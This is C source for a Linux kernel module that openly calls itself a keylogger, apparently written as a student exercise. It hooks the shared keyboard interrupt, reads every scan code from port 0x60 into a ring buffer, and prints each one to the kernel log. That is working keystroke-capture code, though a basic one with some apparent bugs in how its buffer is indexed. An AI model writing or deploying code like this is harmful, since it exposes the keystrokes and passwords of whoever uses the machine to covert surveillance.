#include "keyboard.h"

# define SIZE	1000

static char *id = "keyboard";

static unsigned int scan_array[SIZE];

DEFINE_RWLOCK(keyboard_rwlock);

static unsigned int windex = -1;

static unsigned int rindex = 0;

static struct miscdevice keylogger_misc = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "module_keylogger",
	.fops = &keylogger_misc_fops,
};

/* Assumption : if windex overrun rindex then static size is too small  */

static void do_tasklet(unsigned long unused)
{
	unsigned int packet = 0;
	unsigned int target = 0;

	while ((target = (windex > rindex) ? windex : SIZE)
		&& rindex <= target)
	{
		read_lock(&keyboard_rwlock);
		packet = scan_array[rindex++];
		read_unlock(&keyboard_rwlock);
		printk(KERN_INFO "tasklet : [%x]\n", packet);
		rindex = (rindex == SIZE) ? 0 : rindex;
	}
	/* void spin_lock_irqsave(spinock_t *lock, unsigned long flags) */
	/* void spin_unlock_irqrestore(spinlock_t *lock, unsigned long flags) */
}
DECLARE_TASKLET(keyboard_tasklet, do_tasklet, 0);


/* Assumption : an interrupt handler shouldn't be intterupted by another one on same line */

irqreturn_t	keyboard_interrupt(int irq, void *dev_id)
{
	unsigned int scan_code = 0;

	/* clearing bit for interrupts ? */
	/* get time of day */
	scan_code = inb(0x60);
	if (scan_code) {
		/* format packet */
		if (windex + 1 >= SIZE)
			windex = -1;
		write_lock(&keyboard_rwlock);
		scan_array[++windex] = scan_code;
		write_unlock(&keyboard_rwlock);
		tasklet_schedule(&keyboard_tasklet);
	}
	return IRQ_HANDLED;
}

static int __init keylogger_init(void)
{
	int	result;

	result = misc_register(&keylogger_misc);
	if (result) {
		printk(KERN_INFO "misc keylogger : register failed with %d\n", result);
		goto err;
	}
	else {
		printk(KERN_INFO "misc keylogger : register successful\n");
	}

	result = request_irq(KEYBOARD_IRQ, keyboard_interrupt, IRQF_SHARED, "keyboard-driver", id);
	if (result) {
		printk(KERN_INFO "driver keylogger : IRQ register failed");
		
		goto err;
	}

	return result;


err:
	misc_deregister(&keylogger_misc);
	return result;
}

static void __exit keylogger_cleanup(void)
{
	misc_deregister(&keylogger_misc);
	printk(KERN_INFO "keylogger module : deregister\n");

/*	void driver_register(struct device_driver *drv) */

	free_irq(KEYBOARD_IRQ, id);
}

module_init(keylogger_init);
module_exit(keylogger_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Antoine Riard <ariard@student.42.fr>");
MODULE_DESCRIPTION("keylogger module");
